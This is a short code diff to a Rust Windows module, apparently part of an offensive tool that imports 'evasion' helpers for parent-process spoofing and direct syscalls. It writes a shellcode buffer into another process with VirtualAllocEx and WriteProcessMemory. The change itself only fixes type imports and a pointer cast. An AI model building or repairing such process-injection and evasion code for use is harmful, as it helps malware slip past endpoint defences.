@@ -18,7 +18,9 @@ mod win {
     use crate::evasion::ppid;
     use crate::evasion::syscall::{self, nt_success, SyscallTable};
     use anyhow::Result;
-    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, HANDLE};
+    // use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, HANDLE};
+    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, HANDLE};
+    use windows_sys::core::BOOL;
     use windows_sys::Win32::System::Memory::{
         VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
         PAGE_READWRITE,
@@ -61,8 +63,16 @@ mod win {
         }
 
         let mut written: usize = 0;
+        // if WriteProcessMemory(
+        //     process,
+        //     base,
+        //     shellcode.as_ptr().cast(),
+        //     shellcode.len(),
+        //     &mut written,
+        // ) == FALSE
+        use core::ffi::c_void;
         if WriteProcessMemory(
-            process,
+            process as *mut c_void,
             base,
             shellcode.as_ptr().cast(),
             shellcode.len(),
